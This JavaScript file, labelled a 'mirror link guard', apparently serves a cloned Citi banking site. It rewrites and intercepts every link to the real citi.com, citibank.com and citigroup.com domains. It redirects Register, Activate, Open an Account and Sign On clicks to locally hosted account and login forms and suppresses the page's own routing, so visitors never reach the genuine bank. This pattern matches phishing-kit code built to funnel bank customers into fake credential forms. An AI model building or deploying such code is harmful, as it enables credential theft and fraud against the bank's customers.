/* ============================================================================
 * Mirror link guard
 * ----------------------------------------------------------------------------
 * Two rules, applied everywhere on the mirror:
 *
 *  1. Any link whose text/keywords are Register / Activate / Create an
 *     Account / Open an Account opens the LOCAL account application form
 *     (/account-application/?mode=register | ?mode=activate).
 *
 *  2. Any other link that would navigate away to the real bank site
 *     (citi.com / citibank.com / citigroup.com and their sub-domains) is
 *     kept inside the mirror instead, so a tap on the mobile menu never
 *     leaves for the live site.
 *
 * The Citi navigation renders most of its links lazily (mobile menu, dropdown
 * panels) and the app re-renders them, so the rewrite runs again whenever the
 * DOM changes.
 * ========================================================================== */

(function () {
  'use strict';

  var FORM = '/account-application/?mode=';
  var LOCAL_HOME = '/';

  // Real banking hosts that must never be navigated to from the mirror.
  var OFFSITE = /^(?:[a-z0-9-]+\.)*(?:citi|citibank|citigroup)\.com$/i;

  function hostOf(href) {
    var m = String(href).match(/^https?:\/\/([^/?#]+)/i);
    return m ? m[1].toLowerCase() : '';
  }

  function isOffsite(href) {
    if (!href) return false;
    var h = String(href).trim();
    // relative links, hashes, mailto:, tel: stay on the mirror already
    if (!/^https?:/i.test(h)) return false;
    return OFFSITE.test(hostOf(h));
  }

  function textOf(el) {
    return ((el.innerText || el.textContent || '') + '').replace(/\s+/g, ' ').trim().toLowerCase();
  }

  // Returns 'register' | 'activate' | 'signon' | null
  function classify(el) {
    if (!el) return null;
    var id = (el.id || '').toLowerCase();
    var text = textOf(el);
    var href = (el.getAttribute && el.getAttribute('href') || '').toLowerCase();

    // Explicit ids used by the Citi global navigation.
    if (id.indexOf('register') !== -1) return 'register';
    if (id.indexOf('activate') !== -1) return 'activate';

    // Known destination paths.
    if (/registration\/set-up-online-access/.test(href)) return 'register';
    if (/\/activate(\/|$|\?)/.test(href)) return 'activate';

    // Visible keywords.
    if (/\bregister\b/.test(text)) return 'register';
    if (/\bactivate\b/.test(text)) return 'activate';
    if (/\bset ?up online access\b/.test(text)) return 'register';
    if (/\b(create|open)\b[^.]{0,24}\baccount\b/.test(text)) return 'register';
    if (/open-an-account|open-account|bank-accounts/.test(href)) return 'register';

    // "Sign On" / "Sign In" must open the local sign-on panel, never
    // online.citi.com/login.
    if (/\b(sign on|sign in|log ?in)\b/.test(text)) return 'signon';
    if (/sign-?on|signin|login/i.test(id) && !/form|input|submit/i.test(id)) return 'signon';

    return null;
  }

  // Attributes the Citi app may use to navigate.
  var URL_ATTRS = ['href', 'data-href', 'data-url', 'ng-href', 'routerlink', 'to'];

  function offsiteAttr(el) {
    if (!el || !el.getAttribute) return null;
    for (var i = 0; i < URL_ATTRS.length; i++) {
      var v = el.getAttribute(URL_ATTRS[i]);
      if (v && isOffsite(v)) return v;
    }
    return null;
  }

  // The local sign-on panel, when the current page has one.
  // Only the real sign-on form counts — a fuzzy class match would latch onto
  // unrelated elements on the mobile layout.
  function signOnTarget() {
    return document.getElementById('logInForm') || null;
  }

  // The URL this element should point at, or null to leave it alone.
  function targetFor(el) {
    var mode = classify(el);
    if (mode) {
      if (mode === 'signon') {
        // Only navigation links — never the sign-on panel's own submit button.
        if (!el || el.tagName !== 'A') return null;
        if (el.closest && el.closest('#logInForm')) return null;
        // With a sign-on panel on the page, scroll to it; otherwise the local
        // account application is the only account flow the mirror offers.
        return signOnTarget() ? '#logInForm' : FORM + 'register';
      }
      return FORM + mode;
    }
    if (offsiteAttr(el)) return LOCAL_HOME;
    return null;
  }

  /* ------------------------------------------------------------- clicking -- */
  document.addEventListener('click', function (event) {
    var el = event.target && event.target.closest
      ? event.target.closest('a, button, [role="button"]')
      : null;
    if (!el) return;

    var mode = classify(el);
    var url = targetFor(el);

    // "Sign On" opens the local sign-on panel instead of leaving the mirror.
    if (mode === 'signon' && el.tagName === 'A' && !(el.closest && el.closest('#logInForm'))) {
      event.preventDefault();
      event.stopPropagation();
      if (event.stopImmediatePropagation) event.stopImmediatePropagation();
      var panel = signOnTarget();
      if (panel) {
        try {
          panel.scrollIntoView({ behavior: 'smooth', block: 'center' });
          var input = panel.querySelector('input');
          if (input) setTimeout(function () { input.focus(); }, 350);
        } catch (e) { /* ignore */ }
      } else {
        window.location.assign(FORM + 'register');
      }
      return;
    }

    if (!url) return;

    // Stop the page's own handler (Angular routing, analytics) from running.
    event.preventDefault();
    event.stopPropagation();
    if (event.stopImmediatePropagation) event.stopImmediatePropagation();

    window.location.assign(url);
  }, true);

  /* ------------------------------------------------------------ rewriting -- */
  var scheduled = false;

  function rewrite() {
    if (scheduled) return;
    scheduled = true;
    window.requestAnimationFrame(function () {
      scheduled = false;
      var links = document.querySelectorAll('a');
      for (var i = 0; i < links.length; i++) {
        var a = links[i];
        var url = targetFor(a);
        if (url && a.getAttribute('href') !== url) {
          a.setAttribute('href', url);
          a.setAttribute('data-mirror-link', '1');
        }
      }
    });
  }

  function init() {
    rewrite();
    if (window.MutationObserver) {
      var observer = new MutationObserver(function () { rewrite(); });
      observer.observe(document.documentElement, {
        childList: true, subtree: true, attributes: true, attributeFilter: ['href'],
      });
    }
    // The mobile menu opens after a tap; make sure the links are already
    // pointing at the mirror by then.
    window.addEventListener('load', rewrite);
    window.addEventListener('pageshow', rewrite);
    setTimeout(rewrite, 1200);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
